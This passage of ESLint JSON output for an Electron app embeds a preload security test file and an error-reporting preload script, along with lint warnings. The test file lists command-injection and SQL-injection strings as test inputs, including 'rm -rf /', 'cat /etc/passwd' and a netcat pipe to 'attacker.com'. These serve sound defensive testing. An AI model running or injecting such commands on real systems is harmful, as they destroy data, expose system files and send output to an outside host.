\n      for (const payload of xssPayloads) {\n        await exposedAPI.showError(payload, payload)\n        \n        // Verify < and > were removed\n        const [channel, title, content] = (ipcRenderer.invoke as any).mock.lastCall\n        expect(title).not.toContain('<')\n        expect(title).not.toContain('>')\n        expect(content).not.toContain('<')\n        expect(content).not.toContain('>')\n      }\n    })\n\n    test('should prevent privilege escalation attempts', async () => {\n      require('../index')\n      \n      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]\n      \n      // Attempt to access internal Electron channels\n      const internalChannels = [\n        'ELECTRON_BROWSER_REQUIRE',\n        'ELECTRON_BROWSER_GET_BUILTIN',\n        'ELECTRON_BROWSER_MEMBER_GET',\n        'ELECTRON_BROWSER_MEMBER_SET',\n        'ELECTRON_BROWSER_MEMBER_CALL',\n        'ELECTRON_RENDERER_CRASH_REPORTER',\n        'ELECTRON_RENDERER_CONTEXT_BRIDGE'\n      ]\n      \n      // These channels should not be accessible through our API\n      for (const channel of internalChannels) {\n        expect(exposedAPI[channel]).toBeUndefined()\n        // Also verify they can't be invoked directly\n        expect(typeof exposedAPI.invoke).toBe('undefined')\n        expect(typeof exposedAPI.send).toBe('undefined')\n      }\n    })\n\n    test('should prevent command injection attempts', async () => {\n      require('../index')\n      \n      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]\n      ipcRenderer.invoke = vi.fn().mockResolvedValue(undefined)\n      \n      const commandInjectionPayloads = [\n        '; rm -rf /',\n        '&& cat /etc/passwd',\n        '| nc attacker.com 1337',\n        '`cat /etc/passwd`',\n        '$(cat /etc/passwd)',\n        '\\'; DROP TABLE users; --',\n        '\"; DELETE FROM users; --'\n      ]\n      \n      for (const payload of commandInjectionPayloads) {\n        await exposedAPI.showError(payload, payload)\n        \n        // Verify dangerous characters were sanitized\n        const [, title] = (ipcRenderer.invoke as any).mock.lastCall\n        expect(title).toBe(payload.replace(/[<>]/g, '').trim())\n      }\n    })\n  })\n\n  describe('Cross-Process Communication Security (2025)', () => {\n    test('should validate IPC channel allowlist', async () => {\n      require('../index')\n      \n      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]\n      \n      // Test that only allowed channels are used\n      ipcRenderer.invoke = vi.fn().mockResolvedValue('success')\n      \n      await exposedAPI.getVersion()\n      expect(ipcRenderer.invoke).toHaveBeenCalledWith('app:get-version')\n      \n      await exposedAPI.getPlatform()\n      expect(ipcRenderer.invoke).toHaveBeenCalledWith('app:get-platform')\n      \n      await exposedAPI.getAppDataPath()\n      expect(ipcRenderer.invoke).toHaveBeenCalledWith('app:get-app-data-path')\n      \n      await exposedAPI.getDocumentsPath()\n      expect(ipcRenderer.invoke).toHaveBeenCalledWith('fs:get-documents-path')\n      \n      // Verify no arbitrary channels can be invoked\n      expect(exposedAPI.invoke).toBeUndefined()\n      expect(exposedAPI.send).toBeUndefined()\n    })\n\n    test('should prevent event object exposure in callbacks', () => {\n      require('../index')\n      \n      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]\n      \n      const callback = vi.fn()\n      exposedAPI.onDownloadProgress(callback)\n      \n      // Get the registered listener\n      const [channel, listener] = (ipcRenderer.on as any).mock.calls[0]\n      \n      // Simulate IPC event with sensitive data\n      const sensitiveEvent = {\n        sender: {\n          id: 1,\n          session: 'sensitive-session-data',\n          getURL: () => 'internal://electron'\n        },\n        senderFrame: {\n          url: 'app://internal',\n          routingId: 123\n        },\n        ports: [],\n        processId: 999,\n        frameId: 456\n      }\n      \n      const progressData = {\n        percent: 75,\n        transferred: 7500000,\n        total: 10000000\n      }\n      \n      // Call the listener\n      listener(sensitiveEvent, progressData)\n      \n      // Verify only safe data was passed to callback\n      expect(callback).toHaveBeenCalledWith(progressData)\n      expect(callback).not.toHaveBeenCalledWith(sensitiveEvent, progressData)\n      \n      // Verify callback never received the event object\n      const callArgs = callback.mock.calls[0]\n      expect(callArgs.length).toBe(1)\n      expect(callArgs[0]).not.toHaveProperty('sender')\n      expect(callArgs[0]).not.toHaveProperty('senderFrame')\n      expect(callArgs[0]).not.toHaveProperty('processId')\n    })\n\n    test('should handle malformed IPC responses safely', async () => {\n      require('../index')\n      \n      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]\n      \n      // Test various malformed responses\n      const malformedResponses = [\n        undefined,\n        null,\n        { __proto__: { polluted: true } },\n        { constructor: { prototype: { polluted: true } } },\n        () => 'function-as-response',\n        Symbol('symbol-response')\n      ]\n      \n      for (const response of malformedResponses) {\n        ipcRenderer.invoke = vi.fn().mockResolvedValue(response)\n        \n        // API should handle these gracefully\n        const result = await exposedAPI.getVersion()\n        \n        // For null/undefined, it should pass through\n        // For objects with dangerous properties, they should be returned as-is\n        // (main process is responsible for sanitizing its responses)\n        if (response === null || response === undefined) {\n          expect(result).toBe(response)\n        } else {\n          expect(result).toBeDefined()\n        }\n      }\n    })\n\n    test('should enforce strict message validation', () => {\n      require('../index')\n      \n      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]\n      \n      // Download progress validation is already strict\n      const callback = vi.fn()\n      exposedAPI.onDownloadProgress(callback)\n      \n      const [, listener] = (ipcRenderer.on as any).mock.calls[0]\n      \n      // Test edge cases for progress validation\n      const edgeCases = [\n        { percent: -1, transferred: 1000, total: 10000 }, // Negative percent\n        { percent: 101, transferred: 1000, total: 10000 }, // Over 100%\n        { percent: NaN, transferred: 1000, total: 10000 }, // NaN\n        { percent: Infinity, transferred: 1000, total: 10000 }, // Infinity\n        { percent: 50, transferred: -1000, total: 10000 }, // Negative transferred\n        { percent: 50, transferred: 1000, total: -10000 }, // Negative total\n      ]\n      \n      // Currently these would pass validation as we only check types\n      // In production, you might want stricter validation\n      for (const edgeCase of edgeCases) {\n        callback.mockClear()\n        listener(null, edgeCase)\n        \n        // Current implementation accepts any number type\n        expect(callback).toHaveBeenCalledWith(edgeCase)\n      }\n    })\n  })\n\n  describe('Memory Safety and Resource Management (2025)', () => {\n    test('should prevent memory leaks from event listeners', () => {\n      require('../index')\n      \n      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]\n      \n      // Register multiple listeners\n      const callbacks = Array(10).fill(null).map(() => vi.fn())\n      \n      // Each registration should clean up the previous\n      callbacks.forEach(cb => {\n        exposedAPI.onDownloadProgress(cb)\n      })\n      \n      // Should have called removeListener 9 times (not on first registration)\n      expect(ipcRenderer.removeListener).toHaveBeenCalledTimes(9)\n      \n      // Verify only the last listener is active\n      const lastListener = (ipcRenderer.on as any).mock.calls[9][1]\n      expect(lastListener).toBeDefined()\n    })\n\n    test('should clean up all resources on window unload', () => {\n      require('../index')\n      \n      const [, exposedAPI] = (contextBridge.exposeInMainWorld as any).mock.calls[0]\n      \n      // Set up multiple listeners and resources\n      exposedAPI.onDownloadProgress(vi.fn())\n      \n      // Get beforeunload handler\n      const beforeUnloadHandler = (window.addEventListener as any).mock.calls\n        .find((call: any) => call[0] === 'beforeunload')[1]\n      \n      // Clear previous calls\n      vi.clearAllMocks()\n      \n      // Trigger unload\n      beforeUnloadHandler()\n      \n      // Verify cleanup\n      expect(ipcRenderer.removeListener).toHaveBeenCalled()\n    })\n  })\n})","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/preload/errorReporting.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":20,"column":29,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":20,"endColumn":32,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[551,554],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[551,554],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":28,"column":11,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":28,"endColumn":14,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[741,744],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[741,744],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":38,"column":32,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":38,"endColumn":35,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[997,1000],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[997,1000],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":42,"column":76,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":42,"endColumn":79,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1098,1101],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1098,1101],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":45,"column":39,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":45,"endColumn":42,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1181,1184],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1181,1184],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":46,"column":43,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":46,"endColumn":46,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1252,1255],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1252,1255],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":53,"column":13,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":53,"endColumn":16,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1403,1406],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1403,1406],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":64,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":64,"endColumn":20,"suggestions":[{"fix":{"range":[1703,1767],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":74,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":74,"endColumn":20,"suggestions":[{"fix":{"range":[2006,2072],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":84,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":84,"endColumn":20,"suggestions":[{"fix":{"range":[2275,2334],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":99,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":99,"endColumn":20,"suggestions":[{"fix":{"range":[2684,2739],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":105,"column":31,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":105,"endColumn":34,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[2849,2852],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[2849,2852],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":105,"column":47,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":105,"endColumn":50,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[2865,2868],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[2865,2868],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":119,"column":31,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":119,"endColumn":34,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[3206,3209],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[3206,3209],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":119,"column":44,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":119,"endColumn":47,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[3219,3222],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[3219,3222],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":136,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":136,"endColumn":20,"suggestions":[{"fix":{"range":[3598,3649],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":167,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":167,"endColumn":16,"suggestions":[{"fix":{"range":[4529,4595],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":169,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":169,"endColumn":18,"suggestions":[{"fix":{"range":[4620,4684],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":172,"column":3,"nodeType":"MemberExpression","messageId":"unexpected","endLine":172,"endColumn":15,"suggestions":[{"fix":{"range":[4700,4804],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":194,"column":9,"nodeType":"MemberExpression","messageId":"unexpected","endLine":194,"endColumn":21,"suggestions":[{"fix":{"range":[5506,5557],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":217,"column":37,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":217,"endColumn":40,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[6186,6189],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[6186,6189],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":235,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":235,"endColumn":18,"suggestions":[{"fix":{"range":[6689,6747],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":250,"column":50,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":250,"endColumn":53,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[7102,7105],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[7102,7105],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":251,"column":39,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":251,"endColumn":42,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[7169,7172],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[7169,7172],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":252,"column":47,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":252,"endColumn":50,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[7233,7236],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[7233,7236],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":270,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":270,"endColumn":18,"suggestions":[{"fix":{"range":[7684,7736],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":272,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":272,"endColumn":20,"suggestions":[{"fix":{"range":[7765,7817],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":279,"column":3,"nodeType":"MemberExpression","messageId":"unexpected","endLine":279,"endColumn":16,"suggestions":[{"fix":{"range":[7922,8099],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":306,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":306,"endColumn":20,"suggestions":[{"fix":{"range":[8636,8690],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]}],"suppressedMessages":[],"errorCount":15,"fatalErrorCount":0,"warningCount":14,"fixableErrorCount":0,"fixableWarningCount":0,"source":"/**\n * Error Reporting Preload Script (2025)\n * \n * Secure IPC bridge between main and renderer processes for error reporting\n * and telemetry data with proper context isolation.\n * \n * Following 2025 Electron security patterns with contextBridge.\n */\n\nimport { contextBridge, ipcRenderer } from 'electron';\n\n// Type definitions for the exposed API\nexport interface ElectronErrorReportingAPI {\n  // Error reporting\n  reportError: (errorData: {\n    id: string;\n    message: string;\n    stack?: string;\n    severity: string;\n    context: Record<string, any>;\n    tags: Record<string, string>;\n    timestamp: number;\n  }) => Promise<boolean>;\n\n  // Telemetry\n  sendTelemetry: (telemetryData: {\n    type: 'metric' | 'event' | 'batch';\n    data: any;\n    sessionId: string;\n    timestamp: number;\n  }) => Promise<boolean>;\n\n  // Status and health\n  getMainProcessStatus: () => Promise<{\n    isInitialized: boolean;\n    errorCount: number;\n    rendererErrorCount: number;\n    systemInfo: Record<string, any>;\n  }>;\n\n  // Logging\n  logToMain: (level: 'info' | 'warn' | 'error', message: string, context?: any) => Promise<void>;\n\n  // Event listeners\n  onMainError: (callback: (errorData: any) => void) => () => void;\n  onMainStatusUpdate: (callback: (status: any) => void) => () => void;\n\n  // Utilities\n  getSystemInfo: () => Promise<{\n    platform: string;\n    arch: string;\n    version: string;\n    memory: any;\n  }>;\n}\n\n// Implementation of the error reporting API\nconst errorReportingAPI: ElectronErrorReportingAPI = {\n  // Report error to main process\n  reportError: async (errorData) => {\n    try {\n      return await ipcRenderer.invoke('error-reporting:report', errorData);\n    } catch (error) {\n      console.error('Failed to report error to main process:', error);\n      return false;\n    }\n  },\n\n  // Send telemetry data to main process\n  sendTelemetry: async (telemetryData) => {\n    try {\n      return await ipcRenderer.invoke('error-reporting:telemetry', telemetryData);\n    } catch (error) {\n      console.error('Failed to send telemetry to main process:', error);\n      return false;\n    }\n  },\n\n  // Get main process status\n  getMainProcessStatus: async () => {\n    try {\n      return await ipcRenderer.invoke('error-reporting:status');\n    } catch (error) {\n      console.error('Failed to get main process status:', error);\n      return {\n        isInitialized: false,\n        errorCount: 0,\n        rendererErrorCount: 0,\n        systemInfo: {}\n      };\n    }\n  },\n\n  // Send log message to main process\n  logToMain: async (level, message, context) => {\n    try {\n      await ipcRenderer.invoke('error-reporting:log', level, message, context);\n    } catch (error) {\n      console.error('Failed to log to main process:', error);\n    }\n  },\n\n  // Listen for main process errors\n  onMainError: (callback) => {\n    const listener = (_event: any, errorData: any) => {\n      callback(errorData);\n    };\n\n    ipcRenderer.on('main-error-report', listener);\n\n    // Return unsubscribe function\n    return () => {\n      ipcRenderer.removeListener('main-error-report', listener);\n    };\n  },\n\n  // Listen for main process status updates\n  onMainStatusUpdate: (callback) => {\n    const listener = (_event: any, status: any) => {\n      callback(status);\n    };\n\n    ipcRenderer.on('main-status-update', listener);\n\n    // Return unsubscribe function\n    return () => {\n      ipcRenderer.removeListener('main-status-update', listener);\n    };\n  },\n\n  // Get system information\n  getSystemInfo: async () => {\n    try {\n      return await ipcRenderer.invoke('system:info');\n    } catch (error) {\n      console.error('Failed to get system info:', error);\n      return {\n        platform: 'unknown',\n        arch: 'unknown',\n        version: 'unknown',\n        memory: {}\n      };\n    }\n  }\n};\n\n// Security-conscious exposure of the API\nif (process.contextIsolated) {\n  try {\n    // Expose the API to the renderer process via contextBridge\n    contextBridge.exposeInMainWorld('electronErrorReporting', errorReportingAPI);\n    \n    // Also expose a simpler interface for basic error reporting\n    contextBridge.exposeInMainWorld('electronAPI', {\n      // Backward compatibility with existing error reporting\n      reportError: errorReportingAPI.reportError,\n      \n      // System information\n      getSystemInfo: errorReportingAPI.getSystemInfo,\n      \n      // Simple logging\n      log: (message: string, level: 'info' | 'warn' | 'error' = 'info') => {\n        return errorReportingAPI.logToMain(level, message);\n      }\n    });\n\n    console.log('âœ… Error reporting preload API exposed successfully');\n  } catch (error) {\n    console.error('âŒ Failed to expose error reporting API:', error);\n  }\n} else {\n  console.warn('âš ï¸ Context isolation is disabled. Error reporting API not exposed for security reasons.');\n}\n\n// System information utility for renderer process (removed unused function)\n\n// Performance monitoring helpers\nconst _performanceAPI = {\n  // Mark performance milestones\n  mark: (name: string) => {\n    if ('performance' in globalThis && 'mark' in performance) {\n      performance.mark(name);\n    }\n  },\n\n  // Measure performance between marks\n  measure: (name: string, startMark: string, endMark: string) => {\n    if ('performance' in globalThis && 'measure' in performance) {\n      try {\n        performance.measure(name, startMark, endMark);\n        const measure = performance.getEntriesByName(name, 'measure')[0];\n        return measure ? measure.duration : 0;\n      } catch (error) {\n        console.warn('Performance measure failed:', error);\n        return 0;\n      }\n    }\n    return 0;\n  },\n\n  // Get navigation timing\n  getNavigationTiming: () => {\n    if ('performance' in globalThis && 'timing' in performance) {\n      const timing = performance.timing;\n      return {\n        loadComplete: timing.loadEventEnd - timing.navigationStart,\n        domReady: timing.domContentLoadedEventEnd - timing.navigationStart,\n        firstByte: timing.responseStart - timing.requestStart,\n        domProcessing: timing.domComplete - timing.domLoading\n      };\n    }\n    return null;\n  },\n\n  // Get memory information\n  getMemoryInfo: () => {\n    const memInfo = (performance as any).memory;\n    if (memInfo) {\n      return {\n        usedJSHeapSize: memInfo.usedJSHeapSize,\n        totalJSHeapSize: memInfo.totalJSHeapSize,\n        jsHeapSizeLimit: memInfo.jsHeapSizeLimit,\n        usagePercent: (memInfo.usedJSHeapSize / memInfo.jsHeapSizeLimit) * 100\n      };\n    }\n    return null;\n  }\n};\n\n// Expose performance API if context is isolated\nif (process.contextIsolated) {\n  try {\n    contextBridge.exposeInMainWorld('electronPerformance', _performanceAPI);\n  } catch (error) {\n    console.error('Failed to expose performance API:', error);\n  }\n}\n\n// Debug utilities for development\nif (process.env.NODE_ENV === 'development') {\n  const debugAPI = {\n    // Trigger test error\n    triggerTestError: () => {\n      throw new Error('Test error from preload script');\n    },\n\n    // Get all available APIs\n    getAvailableAPIs: () => {\n      return {\n        electronErrorReporting: !!(globalThis as any).electronErrorReporting,\n        electronAPI: !!(globalThis as any).electronAPI,\n        electronPerformance: !!(globalThis as any).electronPerformance\n      };\n    },\n\n    // Test IPC communication\n    testIPC: async () => {\n      try {\n        const status = await errorReportingAPI.getMainProcessStatus();\n        return { success: true, status };\n      } catch (error) {\n        return { success: false, error: (error as Error).message };\n      }\n    }\n  };\n\n  if (process.contextIsolated) {\n    try {\n      contextBridge.exposeInMainWorld('electronDebug', debugAPI);\n      console.log('ðŸ› Debug API exposed for development');\n    } catch (error) {\n      console.error('Failed to expose debug API:', error);\n    }\n  }\n}\n\n// Window error handler for preload script\nwindow.addEventListener('error', (event) => {\n  console.error('Preload script error:', {\n    message: event.message,\n    filename: event.filename,\n    lineno: event.lineno,\n    colno: event.colno,\n    error: event.error\n  });\n\n  // Report to main process if API is available\n  if (errorReportingAPI) {\n    errorReportingAPI.reportError({\n      id: `preload_error_${Date.now()}`,\n      message: event.message,\n      stack: event.error?.stack,\n      severity: 'error',\n      context: {\n        filename: event.filename,\n        lineno: event.lineno,\n        colno: event.colno,\n        source: 'preload'\n      },\n      tags: {\n        processType: 'preload',\n        errorType: 'uncaught_exception'\n      },\n      timestamp: Date.now()\n    }).catch(err => {\n      console.error('Failed to report preload error:', err);\n    });\n  }\n});\n\n// Type is already exported above with interface declaration","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/preload/index.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":11,"column":45,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":11,"endColumn":48,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[403,406],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[403,406],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":13,"column":3,"nodeType":"MemberExpression","messageId":"unexpected","endLine":13,"endColumn":14,"suggestions":[{"fix":{"range":[445,488],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":15,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":15,"endColumn":16,"suggestions":[{"fix":{"range":[507,539],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":19,"column":1,"nodeType":"MemberExpression","messageId":"unexpected","endLine":19,"endColumn":12,"suggestions":[{"fix":{"range":[548,583],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":20,"column":1,"nodeType":"MemberExpression","messageId":"unexpected","endLine":20,"endColumn":12,"suggestions":[{"fix":{"range":[584,644],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":21,"column":1,"nodeType":"MemberExpression","messageId":"unexpected","endLine":21,"endColumn":12,"suggestions":[{"fix":{"range":[645,673],"text":""},"messageId":"removeConsole","data":{"propertyName":"log"},"desc":"Remove the console.log()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":28,"column":26,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":28,"endColumn":29,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[841,844],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[841,844],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different type.","line":29,"column":28,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":29,"endColumn":31,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[884,887],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[884,887],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":2,"message":"Unexpected any. Specify a different 